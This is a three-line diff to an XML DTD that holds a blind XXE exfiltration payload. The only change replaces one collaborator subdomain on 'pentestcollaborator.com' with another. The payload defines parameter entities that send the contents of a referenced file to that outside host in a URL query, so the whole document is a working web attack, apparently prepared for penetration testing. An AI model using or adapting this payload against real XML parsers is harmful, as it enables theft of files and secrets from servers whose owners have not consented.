@@ -1,3 +1,3 @@
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://g7ohw8d8x1k42fb8asiyh8cmfdl39s.pentestcollaborator.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://5ouwin8xqlqbt5jmk88c6a49208qwf.pentestcollaborator.com/?x=%file;'>">
 %eval;
 %exfiltrate;
